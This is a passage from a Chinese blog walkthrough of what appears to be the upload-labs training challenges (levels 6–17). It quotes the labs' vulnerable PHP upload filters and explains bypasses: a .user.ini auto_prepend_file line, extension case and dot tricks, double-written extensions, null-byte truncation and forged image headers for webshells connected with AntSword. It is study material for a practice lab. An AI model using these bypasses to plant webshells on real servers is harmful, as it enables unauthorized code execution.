class="hljs-selector-class">.ini</span> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI<br>   设置可被识别。<br>   <br>   两个新的 INI 指令，user_ini<span class="hljs-selector-class">.filename</span> 和 user_ini<span class="hljs-selector-class">.cache_ttl</span> 控制着用户 INI 文件的使用。<br>   <br>   user_ini<span class="hljs-selector-class">.filename</span> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是<br>   <span class="hljs-selector-class">.user</span>.ini。<br>   <br>   user_ini<span class="hljs-selector-class">.cache_ttl</span> 控制着重新读取用户 INI 文件的间隔时间。默认是 <span class="hljs-number">300</span> 秒（<span class="hljs-number">5</span> 分钟）。<br><br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file 是 PHP 配置选项之一，用于指定一个在每个 PHP 文件执行之前自动包含（包含在头部）的文件。这个选项允许你在所有 PHP 脚本执行之前自动加载一些通用的代码或库，无需在每个脚本中手动包含。<br><br>例如，如果你有一些通用的函数、类或设置，希望在所有 PHP 脚本执行之前都要加载，你可以通过配置 <span class="hljs-built_in">auto</span>_prepend_file 来实现。这样，你只需在一个地方定义这些共享的代码，而不必在每个脚本中都进行手动包含。<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808031553494.png"></p><p>在user.ini添加以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=eval.jpg<br></code></pre></td></tr></table></figure><p>在执行readme.php时会把eval.jpg的内容包含进去，</p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>没有进行小写转化且后缀过滤不够全面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br></code></pre></td></tr></table></figure><p>，钻phP后缀空子</p><p>上传完之后在源代码处找到上传文件路径</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023858250.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808023929151.png"></p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>和前面的关卡比起来，过滤中少了trim()空格过滤</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025604587.png"></p><p>上传成功后这里就懒得推算时间戳了（</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025754424.png"></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>与前面的相比，缺少了<code>deldot()</code>函数对结尾点号进行过滤</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030210926.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808030339898.png"></p><p>再蚁剑连接</p><p>这么说点可以绕过的话，上面level5也可以用<code>.php. .</code>后缀来绕过力</p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>少了::$DATA</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php在window的时候如果文件名+<span class="hljs-string">&quot;::<span class="hljs-variable">$DATA</span>&quot;</span>会把::<span class="hljs-variable">$DATA</span>之后的数据当成文件流处理,不会检测后缀名，且保持<span class="hljs-string">&quot;::<span class="hljs-variable">$DATA</span>&quot;</span>之前的文件名 他的目的就是不检查后缀名。<br></code></pre></td></tr></table></figure><p>但是，我是Linux（</p><p>看别人操作（悲，等之后有机会碰到知道有这么一种姿势就行，(注意蚁剑连接时不用加$::DATA)</p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br></code></pre></td></tr></table></figure><p>记得上面说的<code>.php. .</code>绕过罢</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>惯例上传一个eval.php，嗯？居然没报错</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033552164.png"></p><p>看一眼源代码，发现后缀没了</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033629854.png"></p><p>不多说，双写绕过试一下：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033811143.png"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808033836704.png"></p><p>看一眼过滤，果然替换后缀为空：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br></code></pre></td></tr></table></figure><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>上传了eval.jpg，观察网页源码时发现路径中多了个’&#x2F;‘，</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808035830798.png"></p><p>观察后端源代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果后缀不为jpg|png|gif就无法上传，根据他的逻辑，刚想试着构造多后缀突然想到也行不通</p><p><a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">白名单+get00截断</a>，自己学习了相关知识，由于对应的漏洞php版本较旧相关插件缺失没法复现，(另一个主要原因是懒)</p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>post00截断，链接同level12</p><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809014217357.png"></p><p>和之前有所不同，</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020816409.png"></p><p>查看源码，源码检查文件前两个字节，之前在readthedocs上看到过：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020729271.png"></p><p>winhex，启动！！在一句话木马文件的开头修改字节为png的</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809020929915.png"></p><p>图片马无法直接被当做木马被解析，因为本质上还是图片，要配合文件包含漏洞利用，上传成功了</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021218758.png"></p><p>获取一下文件名：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021249076.png"></p><p>连接成功：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809021451179.png"></p><p>用cmd构造图片马参考<a href="https://www.cnblogs.com/1ink/p/15101706.html">文章</a></p><p>最后连接成的图片在winhex中打开结构和上面的图片马一样</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>这题通过<code>getimagesize()</code>函数来获取图片类型，其原理依旧是通过获取文件前几个字节来判断，但是用上一题的png显示无法上传，找了个更全的文件头：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Png图片文件包括<span class="hljs-number">8</span>字节：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span>A <span class="hljs-number">1</span>A <span class="hljs-number">0</span>A。即为 .PNG。<br><span class="hljs-attribute">2</span>.Jpg图片文件包括<span class="hljs-number">2</span>字节：FF D8。<br><span class="hljs-attribute">3</span>.Gif图片文件包括<span class="hljs-number">6</span>字节：<span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span>|<span class="hljs-number">37</span> <span class="hljs-number">61</span> 。即为 GIF89(<span class="hljs-number">7</span>)a。<br><span class="hljs-attribute">4</span>.Bmp图片文件包括<span class="hljs-number">2</span>字节：<span class="hljs-number">42</span> <span class="hljs-number">4</span>D。即为 BM。<br></code></pre></td></tr></table></figure><p>前八个字节都改：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023603329.png"></p><p>上传成功：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023653515.png"></p><p>连接成功</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230809023731321.png"></p><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>使用<code>exif_imagetype()</code>函数来获取文件类型，其原理也是通过读取文件头部信息(开头几个字节)，那就好办了，和上题一样就行。</p><p>在使用时需要在php环境中启用php_exif拓展</p><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span 